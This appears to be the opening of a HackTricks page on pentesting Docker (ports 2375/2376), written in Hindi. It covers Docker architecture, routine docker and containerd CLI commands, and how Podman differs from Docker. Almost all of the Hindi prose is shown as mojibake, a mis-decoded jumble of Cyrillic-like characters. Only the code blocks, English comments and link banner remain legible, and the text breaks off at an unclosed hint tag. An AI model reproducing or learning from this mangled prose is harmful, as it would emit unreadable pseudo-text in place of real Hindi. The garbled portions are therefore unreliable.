# 2375, 2376 Docker рдХрд╛ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдПрдХ **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

## Docker Basics

### рдпрд╣ рдХреНрдпрд╛ рд╣реИ

Docker рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЙрдЪреНрдЪ рдЧрддрд┐ рд╡рд╛рд▓реЗ рдирд╡реАрдирддрдо рдирд╡реАрдиреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрджреНрдпреЛрдЧ-рдкреНрд░рдореБрдЦ рдХрдВрдЯреЗрдирд░ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╣реИ, рдЬреЛ рд╕рдВрдЧрдардиреЛрдВ рдХреЛ рдХрд┐рд╕реА рднреА рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╕рд╣рдЬрддрд╛ рд╕реЗ рдмрдирд╛рдиреЗ рдФрд░ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ - рдкреБрд░рд╛рдиреЗ рд╕реЗ рд▓реЗрдХрд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рддрдХ - рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рднреА рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдкрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рдореВрд▓ docker рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░

рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдВ](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc) рд╕реЗ рд╣реИред

* [containerd](http://containerd.io) рдПрдХ рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо рд╣реИ рдЬреЛ **рдЫрд╡рд┐ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг/рд╕рдВрдЧреНрд░рд╣ рд╕реЗ рд▓реЗрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди, рдкрд░реНрдпрд╡реЗрдХреНрд╖рдг рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рддрдХ рдкреВрд░реЗ рдХрдВрдЯреЗрдирд░ рдЬреАрд╡рдирдЪрдХреНрд░ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред **containerd рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдиреАрдЪреЗ рджреА рдЧрдИ рд╣реИред**
* container-shim рд╣реЗрдбрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рддреН runc рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЙрдиреНрд╣реЗрдВ container-shim рдХреЛ рд╕реМрдВрдкрддрд╛ рд╣реИ рдЬреЛ рдордзреНрдпрд╕реНрде рдХреА рддрд░рд╣ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред
* [runc](http://runc.io) рд╣рд▓реНрдХрд╛ рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рд░рдирдЯрд╛рдЗрдо рдХрдВрдЯреЗрдирд░ рд╣реИ, рдЬреЛ OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИред **runc рдХрд╛ рдЙрдкрдпреЛрдЧ containerd рджреНрд╡рд╛рд░рд╛ OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдЙрддреНрдкрдиреНрди рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ libcontainer рдХрд╛ рдкреБрдирд░реНрдкреИрдХреЗрдЬрд┐рдВрдЧ рднреА рд╣реИред
* [grpc](http://www.grpc.io) containerd рдФрд░ docker-engine рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* [OCI](https://www.opencontainers.org) рд░рдирдЯрд╛рдЗрдо рдФрд░ рдЫрд╡рд┐ рдХреЗ рд▓рд┐рдП OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдзреНрдпрд╛рди рд░рдЦрддрд╛ рд╣реИред рдореМрдЬреВрджрд╛ docker рд╕рдВрд╕реНрдХрд░рдг OCI рдЫрд╡рд┐ рдФрд░ рд░рдирдЯрд╛рдЗрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### рдореВрд▓ рдЖрджреЗрд╢
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

рдХрдВрдЯреЗрдирд░реНрдб рдХреЛ рдбреЙрдХрд░ рдФрд░ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд╕рд╛рде рд╣реА рдЕрдиреНрдп рдХрдВрдЯреЗрдирд░ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд▓рд┐рдП рднреА рдЬреЛ рд▓рд┐рдирдХреНрд╕, рд╡рд┐рдВрдбреЛрдЬ, рд╕реЛрд▓рд░рд┐рд╕ рдпрд╛ рдЕрдиреНрдп рдУрдПрд╕ рдкрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд┐рд╕рдХреЙрд▓реНрд╕ рдпрд╛ рдУрдПрд╕ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдЫрд┐рдкрд╛рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИред рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП, рд╣рдо рдЪрд╛рд╣рддреЗ рдереЗ рдХрд┐ рдХрдВрдЯреЗрдирд░реНрдб рдореЗрдВ рд╕рд┐рд░реНрдл рд╡рд╣реА рд╣реЛ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрдирдХреЗ рдкрд╛рд╕ рд╡рд╣реА рди рд╣реЛ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ рдЕрд╕рдВрднрд╡ рд╣реИ рд▓реЗрдХрд┐рди рдХрдо рд╕реЗ рдХрдо рдпрд╣реА рд╣рдо рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВред рдЬреИрд╕реЗ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХрдВрдЯреЗрдирд░реНрдб рдХреЗ рд▓рд┐рдП рдмрд╛рд╣рд░реА рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм рдЖрдк рдПрдХ рд╡рд┐рддрд░рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдмрдирд╛ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рд╣реЛрддрд╛ рд╣реИред рдЖрдЬ рдХреЗ рд╕рдордп рдореЗрдВ рдПрд╕рдбреАрдПрди рдФрд░ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдХреЗ рд╕рд╛рде, рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд▓рд┐рдирдХреНрд╕ рдкрд░ рдиреЗрдЯрд▓рд┐рдВрдХ рдХреЙрд▓реНрд╕ рдХреЛ рдЫрд┐рдкрд╛рдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╣реЛ рдЧрдпрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЗрд╡рд▓ рдбреЙрдХрд░ рдХреА рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдПрдХ рдЙрдкрд╕рдореВрд╣ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдирд░рдб рдореЗрдВ рдбреЙрдХрд░ рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрди рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдирд╣реАрдВ рд╣реИрдВ, рдФрд░ рдЖрдк рдХрдВрдЯреЗрдирд░рдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдХреЗрд▓реЗ рдбреЙрдХрд░ рд╕реНрд╡рд╛рд░реНрдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**рдпрд╣рд╛рдБ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА** [**рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)

Podman рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕, OCI ([рдУрдкрди рдХрдВрдЯреЗрдирд░ рдЗрдирд┐рд╢рд┐рдПрдЯрд┐рд╡](https://github.com/opencontainers)) рдЕрдиреБрд░реВрдк рдХрдВрдЯреЗрдирд░ рдЗрдВрдЬрди рд╣реИред рдпрд╣ рд░реЗрдб рд╣реИрдЯ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдбреЙрдХрд░ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХреБрдЫ рдореБрдЦреНрдп рдЕрдВрддрд░ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдЗрд╕рдХреА рдбреЗрдордирд▓реЗрд╕ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдФрд░ рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЗ рд╕рдорд░реНрдерди рдХреАред рдореВрд▓ рд░реВрдк рд╕реЗ, рджреЛрдиреЛрдВ рдЯреВрд▓ рдПрдХ рд╣реА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ: рдЫрд╡рд┐рдпреЛрдВ рдФрд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХрд╛ рдкреНрд░рдмрдВрдзрдиред **Podman рдХрд╛ рдПрдХ рдЙрджреНрджреЗрд╢реНрдп рдбреЙрдХрд░-рд╕рдВрдЧрдд API рд╣реЛрдирд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдбреЙрдХрд░ CLI рдХреЗ рд▓рдЧрднрдЧ рд╕рднреА CLI (рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЗрдВрдЯрд░рдлрд╝реЗрд╕) рдХрдорд╛рдВрдб Podman рдореЗрдВ рднреА рдЙрдкрд▓рдмреНрдз рд╣реИрдВред

рдЖрдк Podman рдкрд╛рд░рд┐рд╕реНрдерд┐рддрд┐рдХреА рдореЗрдВ рджреЛ рдЕрдиреНрдп рдЙрдкрдХрд░рдг рднреА рдкрд╛рдПрдВрдЧреЗ: Buildah рдФрд░ Skopeoред Buildah рдПрдХ CLI рдЙрдкрдХрд░рдг рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ Skopeo рдПрдХ CLI рдЙрдкрдХрд░рдг рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЫрд╡рд┐рдпреЛрдВ рдкрд░ рдСрдкрд░реЗрд╢рди рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдкреБрд╢, рдкреБрд▓ рдпрд╛ рдЗрдВрд╕реНрдкреЗрдХреНрдЯред [рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдФрд░ рдЙрдирдХреЗ рд╕рдВрдмрдВрдз рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП GitHub рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ](https://github.com/containers/buildah/tree/master/docs/containertools)ред

**рдореБрдЦреНрдп рдЕрдВрддрд░**

**рдбреЙрдХрд░ рдФрд░ Podman рдХреЗ рдмреАрдЪ рд╕рдмрд╕реЗ рдмрдбрд╝рд╛ рдЕрдВрддрд░ рдЙрдирдХреА рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдореЗрдВ рд╣реИ**ред **рдбреЙрдХрд░** рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░** рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдкрд░ рдЪрд▓рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ **Podman** рдПрдХ **рдбреЗрдордирд▓реЗрд╕** рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдкрд░ рдЪрд▓рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдХреНрдпрд╛ рдорддрд▓рдм рд╣реИ? **рдбреЙрдХрд░** рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп, рдЖрдкрдХреЛ рдбреЙрдХрд░ CLI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ **рдкрд┐рдЫрд▓реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдбреЗрдорди** (рдбреЙрдХрд░ рдбреЗрдорди) рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рддрд╛ рд╣реИред рдореБрдЦреНрдп рддрд░реНрдХ рдбреЗрдорди рдореЗрдВ рдирд┐рд╡рд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ **рдбреЗрдорди рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рдкрд░реАрдд, **Podman** рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдЖрдкрдХреЛ **рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рддрд╣рдд рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░ рд░рд╣рд╛ рд╣реИ** (fork/exec), рдФрд░ рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рднреА рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдХреНрдпреЛрдВрдХрд┐ **Podman рдХрд╛ рдбреЗрдордирд▓реЗрд╕ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП Podman рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдХрдВрдЯреЗрдирд░ рджреЗрдЦ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред CLI рдЙрдкрдХрд░рдг рдХрд┐рд╕реА рд╕рд╛рдорд╛рдиреНрдп рдбреЗрдорди рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рддрд╛ рд╣реИ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

рдХреНрдпреЛрдВрдХрд┐ Podman рдХреЗ рдкрд╛рд╕ рдПрдХ рдбреЗрдорди рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕реЗ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдореЗрдВ рдХрдВрдЯреЗрдирд░реНрд╕ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рдпрд╣ **systemd** рдХреЗ рд╕рд╛рде рдПрдХ рдПрдХреАрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ systemd рдпреВрдирд┐рдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред Podman рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЖрдк рдореМрдЬреВрджрд╛ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЗрди рдпреВрдирд┐рдЯреНрд╕ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЙрдирд┐рдЯреНрд╕ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИрдВред systemd рдХреЗ рд╕рд╛рде рдПрдХ рдФрд░ рдПрдХреАрдХрд░рдг рдореЙрдбрд▓ рд╣реИ, рдЬреЛ systemd рдХреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдбреЙрдХрд░ рдбреЗрдорди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП systemd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рджреВрд╕рд░рд╛ рдореБрдЦреНрдп рдЕрдВрддрд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдХреИрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред **Podman** рдХреЗ рд╕рд╛рде, **рдХрдВрдЯреЗрдирд░реНрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рддрд╣рдд рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдбреЗрдорди рдХреЗ рддрд╣рдд рдирд╣реАрдВ**ред рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреА рдЕрд╡рдзрд╛рд░рдгрд╛ рдЖрддреА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рдмрд┐рдирд╛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╢реБрд░реВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░реНрд╕ рд░реВрдЯрдлрд╝реБрд▓ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдПрдХ рдмрдбрд╝реА рдлрд╛рдпрджрд╛ рд░рдЦрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ (рдЖрдкрдиреЗ рд╕рд╣реА рдЧрд┐рдирддреА рдХреА рд╣реИ) рд╡реЗ рд░реВрдЯ рдЦрд╛рддреЗ рдХреЗ рддрд╣рдд рдирд╣реАрдВ рдЪрд▓рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рд▓рд╛рдн рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рдкрдХрдбрд╝ рд▓реЗрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рдореЗрдЬрдмрд╛рди рдкрд░ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реА рд╣реЛрддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╢реБрд░реВ рдХрд┐рдП рдЧрдП рдХрдВрдЯреЗрдирд░реНрд╕ рдХреА рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдпрд╛ рдХреНрд╖рдорддрд╛рдПрдВ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдпрд╣ рдПрдХ рдкреНрд░рд╛рдХреГрддрд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдЬреЛрдбрд╝рддрд╛ рд╣реИред

{% hint style="info" %}
